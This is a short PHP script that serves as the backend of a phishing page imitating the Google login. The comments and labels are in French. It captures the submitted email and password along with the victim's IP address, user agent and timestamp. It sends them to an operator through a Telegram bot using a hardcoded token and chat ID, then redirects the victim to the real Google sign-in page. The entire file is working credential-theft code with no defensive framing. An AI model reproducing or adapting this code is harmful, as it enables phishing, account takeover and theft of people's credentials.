<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = isset($_POST['email']) ? $_POST['email'] : 'Non saisi';
    $password = isset($_POST['password']) ? $_POST['password'] : 'Non saisi';
    $ip = $_SERVER['REMOTE_ADDR'];
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $date = date("Y-m-d H:i:s");

    $message = "🔴 NOUVELLE VICTIME - Google Login\n\n";
    $message .= "📧 Email : " . $email . "\n";
    $message .= "🔑 Password : " . $password . "\n";
    $message .= "🌍 IP : " . $ip . "\n";
    $message .= "📱 User-Agent : " . $user_agent . "\n";
    $message .= "⏰ Date : " . $date . "\n\n";

    $token = "8552249746:AAFUSy-bxQjRkc3LIYkXomeDdl8m9AJ_gIg";
    $chat_id = "8508877242";

    file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=" . urlencode($message));
}

header("Location: https://accounts.google.com/signin");
exit();
?>
